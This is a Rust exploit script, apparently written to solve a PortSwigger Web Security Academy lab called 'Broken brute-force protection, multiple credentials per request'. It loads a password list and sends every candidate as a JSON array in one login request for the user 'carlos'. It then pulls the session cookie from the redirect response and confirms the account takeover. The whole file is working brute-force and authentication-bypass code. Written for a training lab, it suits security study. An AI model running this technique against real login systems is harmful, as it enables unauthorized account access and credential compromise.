/*************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 30/8/2023
*
* Lab: Broken brute-force protection, multiple credentials per request
*
* Steps: 1. Send multiple passwords in the same login request
*        2. Obtain the new session from cookie header
*        3. Login as carlos with the new session
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a9f00c6044016e682f0157a00ad0046.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // read passwords as one big string
    // change the path your passwords list
    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords").unwrap();

    // split the big string to a list of passwords
    // change \n to \r\n if you still a windows user
    let passwords: Vec<&str> = passwords_as_string.split("\n").collect();

    // send multiple passwords in one request
    let send_passwords = client
        .post(format!("{url}/login"))
        .header("Content-Type", "application/json")
        .body(format!(
            "{{\"username\": \"carlos\", \"password\": {:?}}}",
            passwords
        ))
        .send();

    // if the request is successful
    if let Ok(res) = send_passwords {
        println!(
            "{}",
            "[*] Sending multiple passwords in the same request..OK"
                .white()
                .bold()
        );

        // if a redirect happens; means that a valid password exist
        if res.status().as_u16() == 302 {
            // extract the session from cookie header
            let session = extract_session_cookie(res.headers());

            // try to get home page with the new session
            let home = client
                .get(format!("{url}/my-account?id=carlos"))
                .header("Cookie", format!("session={session}"))
                .send();

            // if you get the home page successfully
            if let Ok(home_res) = home {
                // body of the home page
                let home_body = home_res.text().unwrap();

                // pattern to search for
                let carlos_pattern = Regex::new("Your username is: carlos").unwrap();

                // search for pattern to make sure that you logged in as carlos
                let is_carlos = carlos_pattern.find(&home_body).unwrap();

                // if the pattern is found
                if is_carlos.len() != 0 {
                    println!(
                        "{} {}",
                        "✅ Successfully logged in as".white().bold(),
                        "carlos".green().bold()
                    );
                    println!(
                        "{} {} {}",
                        "Use this".white().bold(),
                        session.green().bold(),
                        "session in your browser to login as carlos".white().bold()
                    );
                }
            }
        }
    } else {
        println!("{}", "[!] Failed to issue login request".red().bold())
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************************************
* Function to extract session field from the cookie header
********************************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/****************************************************
* Function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
